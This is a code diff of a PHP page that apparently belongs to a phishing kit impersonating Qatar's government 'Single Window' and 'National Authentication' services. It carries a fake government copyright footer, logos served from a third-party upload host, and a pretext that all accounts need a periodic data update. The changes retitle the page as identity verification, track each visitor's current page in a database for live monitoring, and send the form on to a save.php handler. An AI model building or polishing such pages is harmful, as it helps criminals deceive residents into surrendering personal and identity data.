@@ -15,10 +15,11 @@ try {
     
     $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
     
+    // تحديث اسم الصفحة الحالية إلى صفحة التحقق من الهوية في قاعدة البيانات
     $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
-                               VALUES (:visitor_id, 'صفحة تحديث البيانات', NOW()) 
+                               VALUES (:visitor_id, 'صفحة التحقق من الهوية', NOW()) 
                                ON CONFLICT (visitor_id) 
-                               DO UPDATE SET current_page = 'صفحة تحديث البيانات', last_seen = NOW()");
+                               DO UPDATE SET current_page = 'صفحة التحقق من الهوية', last_seen = NOW()");
     $stmt_vis->execute([':visitor_id' => $visitor_id]);
 } catch (Exception $e) {
     // معالجة صامتة لحماية التصميم
@@ -29,7 +30,7 @@ try {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث البيانات - النافذة الواحدة</title>
+    <title>التحقق من الهوية - النافذة الواحدة</title>
     <style>
         * {
             box-sizing: border-box;
@@ -47,14 +48,16 @@ try {
             align-items: center;
         }
 
-        /* الهيدر الأبيض المنفصل تماماً وبأبعاد ملمومة */
+        /* هيدر بارز ومنفصل تماماً بظل سفلي واضح وأنيق */
         .header-box {
             width: 100%;
             background: #ffffff;
             display: flex;
             justify-content: center;
-            border-bottom: 1px solid #f2f2f2;
+            border-bottom: 1px solid #e0e0e0;
             padding: 12px 0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            z-index: 10;
         }
 
         .header-container {
@@ -65,7 +68,7 @@ try {
             align-items: center;
         }
 
-        /* الروابط الرسمية النظيفة الشفافة وبأحجام صغيرة ومثالية للموبايل */
+        /* اللوجوهات الرسمية الشفافة والنظيفة للموبايل */
         .header-container .logo-right {
             height: 28px;
             width: auto;
@@ -76,52 +79,56 @@ try {
             width: auto;
         }
 
-        /* ضبط حجم ومسافة الكارت ليتطابق مع الاسكرين بالملي */
+        /* ضبط مساحات محتوى الصفحة */
         .page-content {
             width: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 15px 0;
+            padding: 25px 0;
             flex: 1;
         }
 
+        /* الكارت باللون الرمادي الواضح والمقاس الملموم المثالي لشاشات الموبايل */
         .card {
-            background-color: #f9f9f9;
+            background-color: #eeeeee;
             width: 90%;
             max-width: 360px;
-            border: 1px solid #eef0f2;
+            border: 1px solid #dcdcdc;
             border-radius: 6px;
             padding: 22px 18px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.01);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
             margin-top: 5px;
         }
 
+        /* عنوان بلون أسود غامق وصريح جداً */
         .card-title {
             font-size: 19px;
-            font-weight: bold;
-            color: #2b2b2b;
+            font-weight: 800;
+            color: #000000;
             margin-top: 0;
             margin-bottom: 15px;
             padding-bottom: 10px;
-            border-bottom: 1px solid #ededed;
+            border-bottom: 1px solid #d5d5d5;
         }
 
+        /* نصوص الفقرات بلون أسود غامق وواضح للغاية */
         .card-text {
-            font-size: 13.5px;
-            color: #444444;
-            line-height: 1.5;
+            font-size: 14px;
+            font-weight: 600;
+            color: #000000;
+            line-height: 1.6;
             margin-bottom: 15px;
             text-align: justify;
         }
 
-        /* زر استمر الانسيابي الملموم والمطابق للتصميم */
+        /* زر استمر الانسيابي المتناسق */
         .btn-continue {
             width: 100%;
             background-color: #0c73b2;
             color: white;
             border: none;
-            padding: 10px;
+            padding: 11px;
             border-radius: 4px;
             font-size: 15px;
             font-weight: bold;
@@ -133,7 +140,7 @@ try {
             background-color: #0a6296;
         }
 
-        /* فوتر حقوق قطر المتناسق الهادئ */
+        /* فوتر الحقوق السفلي */
         footer {
             padding: 15px 0;
             font-size: 12px;
@@ -147,13 +154,15 @@ try {
 </head>
 <body>
 
+    <!-- الهيدر المنفصل والبارز بشعار التوثيق والنافذة الواحدة -->
     <header class="header-box">
         <div class="header-container">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/RQnjZWnrdYgEbNhJ.svg" alt="النافذة الواحدة" class="logo-right">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/RQnjZWnrdYgEbNhJ.svg" alt="التوثيق الوطني" class="logo-right">
             <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/OzYfGIorjXifdHHC.svg" alt="النافذة الواحدة" class="logo-left">
         </div>
     </header>
 
+    <!-- المحتوى الرئيسي بالكارت الرمادي والنصوص السوداء الداكنة جداً -->
     <div class="page-content">
         <main class="card">
             <h1 class="card-title">تحديث البيانات</h1>
@@ -166,13 +175,15 @@ try {
                 نجري تحديث بيانات على جميع الحسابات بشكل دوري، لنتمكن من تحديث بيانات السكن وأرقام الهواتف والبريد الالكتروني.
             </p>
 
-            <form action="identity_verification.php" method="POST">
+            <!-- هنا يتم التوجيه للملف التالي عند الضغط على زر استمر -->
+            <form action="save.php" method="POST">
                 <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
                 <button type="submit" class="btn-continue">استمر</button>
             </form>
         </main>
     </div>
 
+    <!-- فوتر الحقوق الملموم -->
     <footer>
         © ٢٠٢٦ حكومة قطر
     </footer>
